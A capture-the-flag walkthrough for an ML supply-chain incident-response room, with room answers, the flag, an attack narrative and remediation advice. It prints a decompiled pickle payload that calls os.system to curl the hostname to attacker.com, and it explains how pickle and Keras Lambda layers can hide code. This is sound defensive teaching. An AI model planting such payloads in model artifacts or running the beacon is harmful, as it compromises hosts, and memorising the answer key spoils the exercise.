# TryHackMe: Payload — Walkthrough & Incident Response Writeup

**Room Link:** [TryHackMe - Payload](https://tryhackme.com)  
**Difficulty:** Medium / Advanced AI Security  
**Category:** AI / ML Supply Chain Security & Incident Response  

---

## Scenario Overview

TryTrainMe's production code review inference server began phoning home to an unrecognized external C2 address at `03:14` UTC. The automated firewall rule blocked the outbound egress, but the underlying breach remained active on the host.

As the Incident Response Analyst, our goal is to investigate `/opt/supply-chain/incident/`, inspect the logs, reverse-engineer the malicious `.pkl` and `.h5` model artifacts, and uncover the full breach narrative.

---

## Room Questions & Answers

### Q1: Read the deployment log at `/opt/supply-chain/incident/logs/deployment.log`. The replacement model came from a different organisation than the original. What is the name of that organisation?

Checking the deployment logs reveals the origin switch:

```bash
cat /opt/supply-chain/incident/logs/deployment.log
```

```text
[2024-01-05 09:15:23] INFO Source: huggingface.co/verified-ml-team/code-review-bert
...
[2024-01-26 14:32:12] INFO Source: huggingface.co/trustworthy-ai-lab/code-review-bert-v2
[2024-01-26 14:32:14] WARN New source organisation detected: trustworthy-ai-lab
```

* **Answer:** `trustworthy-ai-lab`

---

### Q2: How many days passed between the replacement model being deployed and the SOC alert firing?

* **Model Deployed:** `2024-01-26`
* **SOC Alert Fired:** `2024-02-16`

Calculating the delta: $\text{Jan 26} \to \text{Feb 16} = 21 \text{ days}$.

* **Answer:** `21`

---

### Q3: Decompile the production model. What Python function does the payload use to execute the shell command?

Decompiling `production_model.pkl` with `fickling`:

```bash
fickling /opt/supply-chain/incident/models/production_model.pkl
```

```python
from os import system
_var0 = system('curl "http://attacker.com/beacon" -d "host=$(hostname)"')
```

The payload imports and calls `system` from the standard `os` library.

* **Answer:** `system`

---

### Q4: What shell command does the payload use to capture the host's identity?

Inspecting the decompiled pickle execution string above:

```python
_var0 = system('curl "http://attacker.com/beacon" -d "host=$(hostname)"')
```

* **Answer:** `hostname`

---

### Q5: The beacon capture log shows the HTTP method used in the outbound request. What is it?

Checking the raw HTTP request captured in the egress log:

```bash
cat /opt/supply-chain/incident/logs/beacon_capture.log
```

```text
[2024-02-16 03:13:47] REQUEST POST /beacon HTTP/1.1
```

* **Answer:** `POST`

---

### Q6: The engineering team staged candidate_model.h5 as a replacement but have not yet deployed it. Run inspect_h5_model.py against it. What is the name of the suspicious layer it contains?

Running the custom HDF5 model inspector script against the staged candidate model:

```bash
python3 tools/inspect_h5_model.py incident/models/candidate_model.h5
```

```text
=== Architecture Inspection: candidate_model.h5 ===
Total layers: 5
[WARNING] Lambda manipulate_output (function: manipulate_output)
```

* **Answer:** `manipulate_output`

---

### Q7: The attacker split the campaign ID across two artefacts to avoid full exposure in any single capture. Examine beacon_capture.log and the candidate model to recover the complete flag.

1. **Artifact 1 (`beacon_capture.log`):** `PAYLOAD host=ml-server-prod-01&id=THM{b4ckd00r_1n_`
2. **Artifact 2 (`candidate_model.h5` output):** `exfil_suffix: pl41n_s1ght}`

Concatenating both artifacts yields the complete flag:

* **Answer:** `THM{b4ckd00r_1n_pl41n_s1ght}`

---

## Detailed Incident Analysis & Attack Narrative

```text
           +-------------------------------------------------------------+
           |                 HuggingFace Model Registry                  |
           |    huggingface.co/trustworthy-ai-lab/code-review-bert-v2    |
           +------------------------------+------------------------------+
                                          |
                                          | Model Pull Request (2024-01-26)
                                          v
           +-------------------------------------------------------------+
           |                 Inference Server Container                  |
           |                    (ml-server-prod-01)                      |
           |                                                             |
           |   1. production_model.pkl (Pickle Deserialization RCE)       |
           |      └─ os.system("curl -d host=$(hostname)...")            |
           |                                                             |
           |   2. candidate_model.h5 (Staged Backup Model)               |
           |      └─ Keras Lambda Layer: manipulate_output               |
           +------------------------------+------------------------------+
                                          |
                                          | Beaconing Attempt (2024-02-16)
                                          v
           +-------------------------------------------------------------+
           |               SOC Firewall / Egress Filter                  |
           |           [BLOCKED] Outbound Request to attacker.com        |
           +-------------------------------------------------------------+
```

### Attack Lifecycle Breakdown

1. **Initial Vector — Registry Typosquatting/Supply Chain Swap:**  
   The attackers published a malicious model `code-review-bert-v2` under the organization `trustworthy-ai-lab` on Hugging Face. The team mistook this for an official iteration of `verified-ml-team/code-review-bert`.

2. **Persistence & Execution — Pickle Deserialization (`.pkl`):**  
   Python's `pickle` format is inherently executable code. When loaded into memory, the arbitrary Python instructions in `production_model.pkl` executed `os.system()` to initiate network reconnaissance.

3. **Secondary Redundancy — Hidden Keras Lambda Backdoor (`.h5`):**  
   Anticipating that the `.pkl` backdoor might be removed or replaced, the attacker also poisoned the staged `candidate_model.h5` file using a custom Keras `Lambda` layer (`manipulate_output`). These layers store raw Python bytecode, allowing execution during inference without altering standard weights.

---

## Remediation & Recommendations

1. **Model Source Verification & Pinning:** Enforce strict cryptographic hash checks (`SHA-256`) and repository origin policies for third-party model registries.
2. **Safe Serialization Formats:** Discontinue the use of `pickle` (`.pkl`) for storing model weights due to inherent code execution risks. Transition strictly to safer serialized formats like `SafeTensors`.
3. **Static Analysis in CI/CD Pipelines:** Implement mandatory scanning using tools such as `fickling` and `modelscan` prior to staging any `.pkl`, `.h5`, or custom layer models into pre-production environments.
4. **Egress Control & Sandbox Inference:** Isolate inference microservices inside network-restricted namespaces to prevent unauthorized egress attempts to external domains.

---

## A Note for AI Security Engineers

> **To the Engineers Guarding the Frontier:**  
> The frontier of cybersecurity is shifting from securing standard binaries to auditing weights, graph structures, and unpickled state tensors. Attackers no longer need to break through firewalls when they can simply publish an optimized model that gets pulled directly into target networks.  
>  
> Stay curious, scrutinize serialization pipelines, and remember: **if a model can execute code during inference, it is not just a statistical asset—it is a binary payload.** Keep verifying!